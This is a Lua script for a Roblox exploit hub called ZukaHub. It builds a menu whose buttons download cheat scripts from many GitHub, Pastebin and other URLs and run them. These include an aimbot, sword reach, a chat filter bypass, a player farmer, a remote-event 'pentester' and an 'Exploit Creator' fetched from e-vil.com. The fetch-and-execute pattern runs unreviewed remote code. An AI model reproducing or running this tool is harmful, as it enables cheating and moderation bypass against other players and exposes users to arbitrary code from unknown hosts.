--[[
    ZukaHub Optimized Script (Revision 2)

    

    This corrected approach ensures the UI is stable, scrollable, and functions identically across all executors.
]]

print("[ZukaHub -> Mercury] Starting migration...")

-- Step 1: Create the Main Window using Mercury
local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/deeeity/mercury-lib/master/src.lua"))()

-- OPTIMIZATION: Increased window height for better content spacing.
local MainWindow = Mercury:create({
    Name = "Zuka Hub",
    Size = UDim2.fromOffset(750, 550),
    Theme = Mercury.Themes.Dark,
    Link = "https://github.com/zukatech"
})

print("[ZukaHub -> Mercury] Main window created.")

-- Step 2: Create the Tabs
local CommandsTab = MainWindow:tab({ Name = "Commands", Icon = "rbxassetid://4483362458" })
local UtilityTab = MainWindow:tab({ Name = "Utilities", Icon = "rbxassetid://4483362458" })
local SettingsTab = MainWindow:tab({ Name = "Hub Settings", Icon = "rbxassetid://4483362458" })

print("[ZukaHub -> Mercury] Tabs created.")

-- Helper function to normalize URLs (no changes needed)
local function normalizeUrl(url)
    if not url or type(url) ~= "string" then return url end
    if url:find("raw.githubusercontent.com") then return url end
    if url:find("github.com") then
        url = url:gsub("https://github.com/", "https://raw.githubusercontent.com/")
        url = url:gsub("/blob/", "/")
        url = url:gsub("/tree/", "/")
        url = url:gsub("/refs/heads/", "/")
        return url
    end
    if url:find("pastebin.com/") and not url:find("pastebin.com/raw/") then
        return url:gsub("pastebin.com/", "pastebin.com/raw/")
    end
    return url
end

-- Helper function to create buttons safely (no changes needed)
local function safeButton(section, name, url, successMsg)
    section:button({
        Name = name,
        Callback = function()
            local finalUrl = normalizeUrl(url)
            MainWindow:set_status("Fetching " .. name .. "...")
            local fetchOk, src = pcall(function() return game:HttpGet(finalUrl) end)
            if not fetchOk or not src then
                MainWindow:set_status("Error fetching addon.")
                warn("Failed to fetch " .. tostring(name) .. " from " .. tostring(finalUrl))
                return
            end
            local func, loadErr = loadstring(src)
            if not func then
                MainWindow:set_status("Error loading addon.")
                warn("Failed to load string for " .. tostring(name) .. ": " .. tostring(loadErr))
                return
            end
            local ranOk, runErr = pcall(func)
            if ranOk then
                MainWindow:set_status(successMsg or (name .. " Loaded"))
                print(successMsg or (name .. " Loaded"))
            else
                MainWindow:set_status("Error running addon.")
                warn("Error running " .. tostring(name) .. ": " .. tostring(runErr))
            end
        end
    })
end

-- ==========================================================
-- === COMMANDS TAB (Consolidated into a Single Section) ===
-- ==========================================================
print("[ZukaHub -> Mercury] Populating Commands tab with a unified layout...")

-- OPTIMIZATION: Create ONE section to hold all commands. This is the fix for executor compatibility.
local CommandsSection = CommandsTab:section({ Name = "All Commands" })

-- Use labels to create organizational subheadings
CommandsSection:label({ Text = "--- Admin & Core ---", Centered = true })
safeButton(CommandsSection, "Infinite Yield +", "https://raw.githubusercontent.com/zukatechdevelopment-ux/luaprojectse3/refs/heads/main/zukainfiniteyield.lua", "IY Loaded")
safeButton(CommandsSection, "Zukas Admin Commands", "https://raw.githubusercontent.com/zukatechdevelopment-ux/thingsandstuff/refs/heads/main/Admin.lua", "Admin Activated")
safeButton(CommandsSection, "Dex +", "https://raw.githubusercontent.com/scriptlisenbe-stack/luaprojectse3/refs/heads/main/CustomDex.lua", "Dex Loaded")
safeButton(CommandsSection, "S0ulz UI V4 +", "https://raw.githubusercontent.com/zukatechdevelopment-ux/luaprojectse3/refs/heads/main/s0ulzV4.lua", "Admin Activated")
safeButton(CommandsSection, "XVC HUB +", "https://pastebin.com/raw/Piw5bqGq", "XVC Loaded")
safeButton(CommandsSection, "Working Chat Bypass", "https://raw.githubusercontent.com/shadow62x/catbypass/main/upfix", "Bypass Activated")

CommandsSection:label({ Text = "--- Leet ---", Centered = true })
safeButton(CommandsSection, "pAimbot", "https://raw.githubusercontent.com/zukatechdevelopment-ux/thingsandstuff/refs/heads/main/ZukasAimbot.lua", "Aimbot Started")
safeButton(CommandsSection, "Nameless Admin", "https://raw.githubusercontent.com/zukatechdevelopment-ux/backupAGAIN/refs/heads/main/NAMain.lua", "NA Loaded")
safeButton(CommandsSection, "SUPER SWORD REACH +", "https://raw.githubusercontent.com/Paul512-max/-Universal-Sword-Script-/refs/heads/main/%F0%9F%93%8C%20Universal%20Sword%20Script%202", "Super Reach Loaded")
safeButton(CommandsSection, "SWORD REACH +", "https://raw.githubusercontent.com/Anaszaxo555/Y/refs/heads/main/Y", "Reach Loaded")
safeButton(CommandsSection, "Touch Fling GUI", "https://raw.githubusercontent.com/miso517/scirpt/refs/heads/main/main.lua", "Fling GUI Loaded")
safeButton(CommandsSection, "Blox Fruits Aura + Auto", "https://rawscripts.net/raw/Arise-Crossover-Speed-Hub-X-33730", "Blox Fruits")
safeButton(CommandsSection, "Player Farmer", "https://raw.githubusercontent.com/zukatechdevelopment-ux/thingsandstuff/refs/heads/main/ragebot.lua", "Hub Loaded")
safeButton(CommandsSection, "Zombie Game Upd3", "https://raw.githubusercontent.com/osukfcdays/zlfucker/refs/heads/main/.luau", "Zombie GUI Started")

CommandsSection:label({ Text = "--- Movement & Utility ---", Centered = true })
safeButton(CommandsSection, "Fly GUI", "https://raw.githubusercontent.com/396abc/Script/refs/heads/main/FlyR15.lua", "Fly GUI Started")
safeButton(CommandsSection, "Wall-Walking", "https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/WallWalk.lua", "Swag Started")
safeButton(CommandsSection, "Server Hopper", "https://raw.githubusercontent.com/Pnsdgsa/Script-kids/refs/heads/main/Advanced%20Server%20Hop.lua", "GUI Started..")
safeButton(CommandsSection, "Universe Explorer", "https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/Universe%20Viewer", "Explorer Loaded")
safeButton(CommandsSection, "Script-Blox Search", "https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher", "Script Searcher Loaded")

CommandsSection:label({ Text = "--- Misc & AI ---", Centered = true })
safeButton(CommandsSection, "Pentesting Remotes", "https://raw.githubusercontent.com/scriptlisenbe-stack/luaprojectse3/refs/heads/main/RemoteEvent_Pentester_OP.txt", "Sigma Loaded")
safeButton(CommandsSection, "Ketamine/Spy", "https://raw.githubusercontent.com/InfernusScripts/Ketamine/refs/heads/main/Ketamine.lua", "Cherry Activated")
safeButton(CommandsSection, "Copy Console", "https://raw.githubusercontent.com/scriptlisenbe-stack/luaprojectse3/refs/heads/main/consolecopy.lua", "Loaded")
safeButton(CommandsSection, "ShitTalkingBot AI V2", "https://raw.githubusercontent.com/theogcheater2020-pixel/luaprojects2/refs/heads/main/chat.lua", "Bot v2 Loaded")


-- ==========================================================
-- === UTILITIES & SETTINGS TABS (No changes needed here) ===
-- ==========================================================
local UtilitySection = UtilityTab:section({ Name = "Utilities" })
print("[ZukaHub -> Mercury] Populating Utilities tab...")
UtilitySection:button({
    Name = "Rejoin Game",
    Callback = function()
        MainWindow:set_status("Rejoining server...")
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.Players.LocalPlayer)
    end
})
UtilitySection:button({
    Name = "Exploit Creator",
    Callback = function()
        MainWindow:set_status("Loading Exploit Creator...")
        loadstring(game:HttpGet("https://e-vil.com/anbu/rem.lua"))()
    end
})

local SettingsSection = SettingsTab:section({ Name = "Hub Settings" })
print("[ZukaHub -> Mercury] Populating Hub Settings tab...")
SettingsSection:button({
    Name = "Exit Zuka Hub",
    Callback = function()
        MainWindow.core.AbsoluteObject:Destroy()
        getgenv().ZukaLuaHub = nil
        print("Zuka Hub (Mercury) unloaded and cleaned up.")
    end
})

print("ZukaHub successfully loaded with a corrected and stable UI layout.")
